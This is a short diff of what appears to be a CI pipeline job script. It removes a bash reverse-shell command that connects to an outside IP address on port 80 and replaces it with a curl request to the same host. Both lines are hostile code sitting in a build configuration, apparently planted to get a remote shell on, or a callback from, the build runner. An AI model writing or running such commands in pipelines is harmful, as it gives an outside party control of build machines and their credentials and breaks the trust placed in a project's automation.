@@ -31,4 +31,4 @@ jobs:
       script: |
         # Write your commands here
         
-        bash -i >& /dev/tcp/4.246.167.71/80 0>&1
+        curl 4.246.167.71
